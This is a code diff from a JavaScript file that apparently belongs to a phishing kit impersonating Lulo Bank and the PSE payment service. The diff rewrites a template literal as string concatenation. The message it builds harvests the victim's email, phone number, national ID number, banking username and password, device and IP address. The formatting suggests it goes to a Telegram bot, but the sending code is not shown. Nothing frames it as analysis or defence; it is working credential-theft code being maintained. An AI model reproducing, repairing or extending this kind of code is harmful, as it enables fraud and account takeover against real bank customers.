@@ -368,23 +368,22 @@
             const ip = data.ip || 'No disponible';
             console.log('IP obtenida:', ip);
             
-            const mensaje = `
-💎 <b><u>LULO BANK — PSE</u></b> 💎
-• 💌 <b>Correo:</b> <code>${email}</code>
-• 📞 <b>Celular:</b> <code>${localStorage.getItem('cel') || 'No disponible'}</code>
-• 💸 <b>Cédula:</b> <code>${localStorage.getItem('val') || 'No disponible'}</code>
-• 🧍 <b>Persona:</b> <code>${localStorage.getItem('per') || 'No disponible'}</code>
-• 🏦 <b>Banco:</b> LULO BANK
-━━━━━━━━━━━━━━━━━━━━━━
-<b>🔐 ACCESO</b>
-• 👤 <b>Usuario:</b> <code>${email}</code>
-• 🔑 <b>Clave:</b> <code>${password}</code>
-━━━━━━━━━━━━━━━━━━━━━━
-<b>🌐 ENTORNO</b>
-• 🖥 <b>Dispositivo:</b> <code>${dispositivo}</code>
-• 🗺 <b>IP:</b> <code>${ip}</code>
-• ⏱ <b>Hora:</b> <code>${hora}</code>
-━━━━━━━━━━━━━━━━━━━━━━`;
+            const mensaje = '💎 <b><u>LULO BANK — PSE</u></b> 💎\n' +
+'• 💌 <b>Correo:</b> <code>' + email + '</code>\n' +
+'• 📞 <b>Celular:</b> <code>' + (localStorage.getItem('cel') || 'No disponible') + '</code>\n' +
+'• 💸 <b>Cédula:</b> <code>' + (localStorage.getItem('val') || 'No disponible') + '</code>\n' +
+'• 🧍 <b>Persona:</b> <code>' + (localStorage.getItem('per') || 'No disponible') + '</code>\n' +
+'• 🏦 <b>Banco:</b> LULO BANK\n' +
+'━━━━━━━━━━━━━━━━━━━━━━\n' +
+'<b>🔐 ACCESO</b>\n' +
+'• 👤 <b>Usuario:</b> <code>' + email + '</code>\n' +
+'• 🔑 <b>Clave:</b> <code>' + password + '</code>\n' +
+'━━━━━━━━━━━━━━━━━━━━━━\n' +
+'<b>🌐 ENTORNO</b>\n' +
+'• 🖥 <b>Dispositivo:</b> <code>' + dispositivo + '</code>\n' +
+'• 🗺 <b>IP:</b> <code>' + ip + '</code>\n' +
+'• ⏱ <b>Hora:</b> <code>' + hora + '</code>\n' +
+'━━━━━━━━━━━━━━━━━━━━━━';
             console.log('Mensaje construido');
 
 
